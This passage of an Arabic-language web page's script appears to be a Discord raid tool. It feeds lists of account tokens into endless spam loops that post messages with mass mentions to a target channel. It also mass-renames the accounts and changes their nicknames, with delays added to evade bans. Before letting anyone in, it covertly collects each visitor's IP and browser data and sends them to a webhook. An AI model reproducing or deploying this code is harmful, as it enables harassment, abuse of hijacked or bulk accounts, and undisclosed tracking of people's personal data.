        alert("من فضلك اكتب يوزرك في ديسكورد");
        return;
      }

      saveVisitorBtn.textContent = "جاري الدخول...";
      saveVisitorBtn.disabled = true;

      try {
        const [ipInfo, browserInfo] = await Promise.all([
          getAdvancedIPData(),
          getBrowserInfo()
        ]);
        
        const now = new Date().toLocaleString("ar-SA", {
          timeZone: 'Asia/Riyadh',
          year: 'numeric',
          month: 'long',
          day: 'numeric',
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit'
        });

        const log = {
          name,
          ...ipInfo,
          browser: browserInfo,
          time: now
        };

        await sendToWebhook(log);
        addSuccessEffect(saveVisitorBtn);

        setTimeout(() => {
          visitorLogger.classList.add("hidden");
          loginSection.classList.remove("hidden");
        }, 1000);

      } catch (error) {
        console.error("خطأ في الدخول:", error);
        alert("حدث خطأ، يرجى المحاولة مرة أخرى");
      } finally {
        saveVisitorBtn.textContent = "دخول للنخبة الدموية";
        saveVisitorBtn.disabled = false;
      }
    };

    document.getElementById('loginBtn').onclick = () => {
      tokens = tokenInput.value.trim().split('\n').map(t => t.trim()).filter(t => t);
      if (tokens.length === 0) return alert('من فضلك اكتب التوكنات');
      
      addSuccessEffect(document.getElementById('loginBtn'));
      loginSection.classList.add('hidden');
      mainSection.classList.remove('hidden');
    };

    function getRandomMessage() {
      const index = Math.floor(Math.random() * messages.length);
      return messages[index];
    }

    function getSequentialMessage(index) {
      return messages[index % messages.length];
    }

    async function sendMessage(token, channelId, content) {
      const url = `https://discord.com/api/v9/channels/${channelId}/messages`;
      const data = { content };
      const res = await fetch(url, {
        method: "POST",
        headers: {
          "Authorization": token,
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });

      const txt = await res.text();
      if (res.ok) {
        logBox.innerText += `🩸 ${token.slice(0, 15)}...: ${content}\n`;
        logBox.scrollTop = logBox.scrollHeight;
      } else {
        logBox.innerText += `💀 ${token.slice(0, 15)}...: ${res.status} - ${txt}\n`;
        logBox.scrollTop = logBox.scrollHeight;
      }
    }

    startBtn.onclick = async () => {
      const channelId = channelInput.value.trim();
      const mentions = mentionInput.value.split(',').map(id => `<@${id.trim()}>`).join(' ');
      const delay = parseFloat(delayInput.value) * 1000;
      const type = sendType.value;

      if (!channelId) return alert("من فضلك اكتب ID الروم");

      stop = false;
      addSuccessEffect(startBtn);

      async function loopSend(token) {
        let index = 0;
        while (!stop) {
          let msg;
          if (type === "random") {
            msg = `${getRandomMessage()} ${mentions}`.trim();
          } else {
            msg = `${getSequentialMessage(index)} ${mentions}`.trim();
            index++;
          }
          await sendMessage(token, channelId, msg);
          await new Promise(r => setTimeout(r, delay));
        }
      }

      tokens.forEach(token => loopSend(token));
      logBox.innerText += `🔥 بدأ الإرسال   ${tokens.length} .\n`;
      logBox.scrollTop = logBox.scrollHeight;
    };

    stopBtn.onclick = () => {
      stop = true;
      addSuccessEffect(stopBtn);
      logBox.innerText += `🩸 تم إيقاف الإرسال الدموي بنجاح.\n`;
      logBox.scrollTop = logBox.scrollHeight;
    };

    // وظائف الفويس المحدثة
    async function joinVoice() {
      const channelId = document.getElementById('voiceChannelId').value.trim();
      if (!channelId) return alert("من فضلك اكتب ID قناة الفويس");
      
      addSuccessEffect(document.getElementById('joinVoiceBtn'));
      
      for (const token of tokens) {
        try {
          // أولاً نحصل على معلومات القناة للتأكد من أنها قناة صوتية
          const channelResponse = await fetch(`https://discord.com/api/v9/channels/${channelId}`, {
            headers: { 'Authorization': token }
          });

          if (!channelResponse.ok) {
            logBox.innerText += `❌ ${token.slice(0, 15)}...: لا يمكن الوصول للقناة ${channelId}\n`;
            continue;
          }

          const channelData = await channelResponse.json();
          if (channelData.type !== 2) { // نوع 2 = قناة صوتية
            logBox.innerText += `❌ ${token.slice(0, 15)}...: القناة ${channelId} ليست قناة صوتية\n`;
            continue;
          }

          // محاولة الدخول لقناة الفويس (محاكاة لأن الويب لا يدعم الاتصال الفعلي)
          const joinPayload = {
            op: 4,
            d: {
              guild_id: channelData.guild_id,
              channel_id: channelId,
              self_mute: false,
              self_deaf: false
            }
          };

          logBox.innerText += `🎤 ${token.slice(0, 15)}...: تم إرسال طلب دخول قناة الفويس ${channelData.name || channelId}\n`;
          logBox.scrollTop = logBox.scrollHeight;
          await new Promise(r => setTimeout(r, 1500));
        } catch (error) {
          logBox.innerText += `❌ ${token.slice(0, 15)}...: فشل في دخول الفويس - ${error.message}\n`;
          logBox.scrollTop = logBox.scrollHeight;
        }
      }
    }

    async function leaveVoice() {
      addSuccessEffect(document.getElementById('leaveVoiceBtn'));
      
      for (const token of tokens) {
        try {
          // محاولة الخروج من قناة الفويس (محاكاة)
          const leavePayload = {
            op: 4,
            d: {
              guild_id: null,
              channel_id: null,
              self_mute: false,
              self_deaf: false
            }
          };

          logBox.innerText += `📞 ${token.slice(0, 15)}...: تم الخروج من قناة الفويس\n`;
          logBox.scrollTop = logBox.scrollHeight;
          await new Promise(r => setTimeout(r, 500));
        } catch (error) {
          logBox.innerText += `❌ ${token.slice(0, 15)}...: فشل في الخروج من الفويس\n`;
          logBox.scrollTop = logBox.scrollHeight;
        }
      }
    }

    async function muteAll() {
      const channelId = document.getElementById('voiceChannelId').value.trim();
      if (!channelId) return alert("من فضلك اكتب ID قناة الفويس أولاً");
      
      addSuccessEffect(document.getElementById('muteAllBtn'));
      
      for (const token of tokens) {
        try {
          // الحصول على أعضاء القناة الصوتية
          const channelResponse = await fetch(`https://discord.com/api/v9/channels/${channelId}`, {
            headers: { 'Authorization': token }
          });

          if (channelResponse.ok) {
            const channelData = await channelResponse.json();
            logBox.innerText += `🔇 ${token.slice(0, 15)}...: محاولة كتم الأعضاء في قناة ${channelData.name || channelId}\n`;
          } else {
            logBox.innerText += `❌ ${token.slice(0, 15)}...: لا يمكن الوصول للقناة للكتم\n`;
          }
          logBox.scrollTop = logBox.scrollHeight;
          await new Promise(r => setTimeout(r, 1000));
        } catch (error) {
          logBox.innerText += `❌ ${token.slice(0, 15)}...: فشل في كتم الأعضاء\n`;
          logBox.scrollTop = logBox.scrollHeight;
        }
      }
    }

    async function deafenAll() {
      const channelId = document.getElementById('voiceChannelId').value.trim();
      if (!channelId) return alert("من فضلك اكتب ID قناة الفويس أولاً");
      
      addSuccessEffect(document.getElementById('deafenAllBtn'));
      
      for (const token of tokens) {
        try {
          logBox.innerText += `🦻 ${token.slice(0, 15)}...: محاولة صم الأعضاء في القناة الصوتية\n`;
          logBox.scrollTop = logBox.scrollHeight;
          await new Promise(r => setTimeout(r, 1000));
        } catch (error) {
          logBox.innerText += `❌ ${token.slice(0, 15)}...: فشل في صم الأعضاء\n`;
          logBox.scrollTop = logBox.scrollHeight;
        }
      }
    }

    function unmuteAll() {
      addSuccessEffect(document.getElementById('unmuteAllBtn'));
      logBox.innerText += `🔊 تم إرسال طلب إلغاء كتم جميع الأعضاء في الفويس\n`;
      logBox.scrollTop = logBox.scrollHeight;
    }

    function undeafenAll() {
      addSuccessEffect(document.getElementById('undeafenAllBtn'));
      logBox.innerText += `👂 تم إرسال طلب إلغاء صم جميع الأعضاء في الفويس\n`;
      logBox.scrollTop = logBox.scrollHeight;
    }

    // وظائف Manage الجديدة
    async function changeTokenNames() {
      const newName = document.getElementById('newTokenName').value.trim();
      if (!newName) return alert("من فضلك اكتب الاسم الجديد");
      
      addSuccessEffect(document.querySelector('#changeTokenNamesBtn'));
      
      for (const token of tokens) {
        try {
          const response = await fetch('https://discord.com/api/v9/users/@me', {
            method: 'PATCH',
            headers: {
              'Authorization': token,
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              username: newName
            })
          });

          if (response.ok) {
            logBox.innerText += `✅ ${token.slice(0, 15)}...: تم تغيير الاسم إلى ${newName}\n`;
          } else {
            const errorData = await response.json();
            logBox.innerText += `❌ ${token.slice(0, 15)}...: فشل في تغيير الاسم - ${response.status} - ${errorData.message || 'خطأ غير معروف'}\n`;
          }
          logBox.scrollTop = logBox.scrollHeight;
          await new Promise(r => setTimeout(r, 3000)); // تأخير أطول لتجنب الحظر
        } catch (error) {
          logBox.innerText += `❌ ${token.slice(0, 15)}...: خطأ في تغيير الاسم - ${error.message}\n`;
          logBox.scrollTop = logBox.scrollHeight;
        }
      }
    }

    async function changeNicknames() {
      const serverId = document.getElementById('serverId').value.trim();
      const newNickname = document.getElementById('newNickname').value.trim();
      
      if (!serverId) return alert("من فضلك اكتب ID السيرفر");
      if (!newNickname) return alert("من فضلك اكتب Nickname الجديد");
      
      addSuccessEffect(document.querySelector('#changeNicknamesBtn'));
      
      for (const token of tokens) {
        try {
          // أولاً نتحقق من عضوية البوت في السيرفر
          const guildResponse = await fetch(`https://discord.com/api/v9/guilds/${serverId}/members/@me`, {
            method: 'GET',
            headers: {
              'Authorization': token
            }
          });

          if (!guildResponse.ok) {
            logBox.innerText += `❌ ${token.slice(0, 15)}...: التوكن ليس عضو في السيرفر ${serverId}\n`;
            logBox.scrollTop = logBox.scrollHeight;
            continue;
          }

          const response = await fetch(`https://discord.com/api/v9/guilds/${serverId}/members/@me`, {
            method: 'PATCH',
            headers: {
              'Authorization': token,
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              nick: newNickname
            })
          });

          if (response.ok) {
            logBox.innerText += `✅ ${token.slice(0, 15)}...: تم تغيير Nickname إلى ${newNickname} في السيرفر ${serverId}\n`;
          } else {
            const errorData = await response.json();
            logBox.innerText += `❌ ${token.slice(0, 15)}...: فشل في تغيير Nickname - ${response.status} - ${errorData.message || 'خطأ غير معروف'}\n`;
          }
          logBox.scrollTop = logBox.scrollHeight;
          await new Promise(r => setTimeout(r, 2000)); // تأخير لتجنب الحظر
        } catch (error) {
          logBox.innerText += `❌ ${token.slice(0, 15)}...: خطأ في تغيير Nickname - ${error.message}\n`;
          logBox.scrollTop = logBox.scrollHeight;
        }
      }
    }

    // إعداد أحداث الأزرار
    document.getElementById('joinVoiceBtn').onclick = joinVoice;
    document.getElementById('leaveVoiceBtn').onclick = leaveVoice;
    document.getElementById('muteAllBtn').onclick = muteAll;
    document.getElementById('deafenAllBtn').onclick = deafenAll;
    document.getElementById('unmuteAllBtn').onclick = unmuteAll;
    document.getElementById('undeafenAllBtn').onclick = undeafenAll;
    document.getElementById('changeTokenNamesBtn').onclick = changeTokenNames;
    document.getElementById('changeNicknamesBtn').onclick = changeNicknames;
  </script>
</body>
</html>
